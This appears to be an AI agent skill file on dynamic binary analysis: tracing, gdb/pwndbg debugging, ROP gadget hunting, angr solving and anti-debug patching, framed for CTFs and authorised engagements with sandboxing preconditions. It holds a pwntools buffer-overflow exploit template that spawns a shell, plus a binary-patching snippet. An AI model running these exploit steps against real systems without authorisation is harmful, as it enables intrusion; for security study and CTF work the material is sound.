---
name: re-dynamic
description: "Dynamic binary analysis skill. Runtime debugging, system call tracing, library call tracing, memory inspection, and exploit development using gdb, pwndbg, strace, ltrace, and angr. Triggers: 'dynamic analysis', 'debug binary', 'gdb', 'strace', 'ltrace', 'runtime analysis', 'exploit development', 'rop chain', 'buffer overflow'."
---

# Dynamic Reverse Engineering

You are performing **dynamic binary analysis** — running and debugging the target to observe runtime behavior. Only run in a safe, isolated environment (VM, Docker, sandbox).

## Safety Preconditions

1. Run in isolated VM or container — never on host
2. No network access unless specifically required for analysis
3. Snapshot VM before execution
4. Monitor for persistence attempts (cron, registry)

## Tool Priority Order

1. **gdb + pwndbg** — primary debugger with exploit-dev extensions
2. **strace** — system call tracing
3. **ltrace** — library call tracing
4. **angr** — symbolic execution (automated path exploration)
5. **frida** — dynamic instrumentation

## Workflow

### Phase 1: Initial Execution (Isolated)

```bash
# Run with strace to capture all syscalls
strace -f -o strace.log ./target_binary [args]
grep -E "(open|read|write|connect|execve)" strace.log > interesting-syscalls.txt

# Run with ltrace to capture library calls
ltrace -f -o ltrace.log ./target_binary [args]
grep -E "(strcmp|strncmp|memcmp|strcpy|gets|printf)" ltrace.log > vulnerable-calls.txt
```

### Phase 2: Security Feature Detection

```bash
# checksec — identify mitigations
checksec --file=target_binary
# or via pwndbg:
gdb -q target_binary -ex "checksec" -ex quit
```

Output to look for:
- **RELRO**: Full RELRO = harder to exploit PLT/GOT
- **Stack Canary**: Present = stack overflow harder
- **NX**: Present = no shellcode execution (need ROP)
- **PIE**: Present = ASLR applies to binary (need leak)
- **FORTIFY**: Source fortification

### Phase 3: GDB / Pwndbg Debugging

```bash
# Launch with pwndbg
gdb -q ./target_binary

# Essential pwndbg commands:
# run [args]           — start execution
# break main           — breakpoint at main
# break *0x401234      — breakpoint at address
# ni / si              — next instruction / step into
# x/20wx $rsp          — examine 20 words at RSP
# x/s $rdi             — examine string at RDI
# info registers       — dump all registers
# backtrace            — call stack
# heap                 — heap chunks (pwndbg)
# rop --grep "pop rdi" — find ROP gadgets
# cyclic 200           — generate de Bruijn pattern
# cyclic -l <value>    — find offset from crashed EIP/RIP

# Find offset for stack overflow:
# 1. run with cyclic pattern
gdb -q -ex "run $(python3 -c 'import pwn; print(pwn.cyclic(200).decode())')" target_binary
# 2. After crash:
# pwndbg> cyclic -l <$rsp value>
```

### Phase 4: Memory Inspection

```bash
# Examine process memory layout
cat /proc/$(pgrep target_binary)/maps   # Linux

# In gdb:
# vmmap                — pwndbg memory map
# search -t bytes "\x41\x41" — search memory
# telescope $rsp       — smart stack inspection
```

### Phase 5: ROP Chain Development

```bash
# Find gadgets with radare2
r2 -A -q -c "'/R pop rdi'" target_binary > gadgets-pop-rdi.txt
r2 -A -q -c "'/R ret'"     target_binary > gadgets-ret.txt
r2 -A -q -c "'/R syscall'" target_binary > gadgets-syscall.txt

# ROPgadget (install: pip install ROPgadget)
ROPgadget --binary target_binary --rop > all-gadgets.txt
ROPgadget --binary target_binary --ret > ret-gadgets.txt
ROPgadget --binary target_binary --rop | grep "pop rdi"

# pwntools for exploit scripting
cat > exploit.py << 'EOF'
from pwn import *

elf = ELF('./target_binary')
p = process('./target_binary')
# p = remote('host', port)

offset = 40          # from cyclic pattern
ret = 0x401234       # from gadget search
pop_rdi = 0x401235
bin_sh = next(elf.search(b'/bin/sh'))
system = elf.plt['system']

payload = b'A' * offset
payload += p64(ret)           # stack alignment
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)
p.interactive()
EOF
python3 exploit.py
```

### Phase 6: Symbolic Execution with angr

```bash
# Automate path exploration to reach target function/address
cat > angr_solve.py << 'EOF'
import angr

proj = angr.Project('./target_binary', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find path to success, avoid bad paths
simgr.explore(
    find=0x401234,    # address of "win" / correct path
    avoid=0x401100,   # address of "lose" / bad path
)

if simgr.found:
    found = simgr.found[0]
    print("Input:", found.posix.dumps(0))
EOF
python3 angr_solve.py
```

### Phase 7: Anti-Debug Bypass

```bash
# Patch IsDebuggerPresent to always return 0
# In gdb:
gdb -q target_binary
# break at IsDebuggerPresent
# set $rax = 0   # force return 0
# continue

# Patch NOP-out check:
# find the CMP/JNE after IsDebuggerPresent call
# replace with NOP (0x90) using hex editor or gdb
python3 -c "
import struct
with open('target_binary', 'r+b') as f:
    f.seek(0x1234)  # offset of check
    f.write(b'\x90' * 2)  # NOP 2 bytes
"
```

## Output Structure

```
engagement/re/dynamic/
├── strace.log                  # All syscalls
├── ltrace.log                  # Library calls
├── interesting-syscalls.txt    # Filtered syscalls
├── checksec-output.txt         # Security mitigations
├── gadgets-*.txt               # ROP gadgets
├── exploit.py                  # Exploit script
└── angr_solve.py               # Symbolic execution script
```

## Next Phase

- Document findings in a technical RE report
- If CTF: submit flag
- If vulnerability: pass to `pentest-exploit` or `pentest-report`
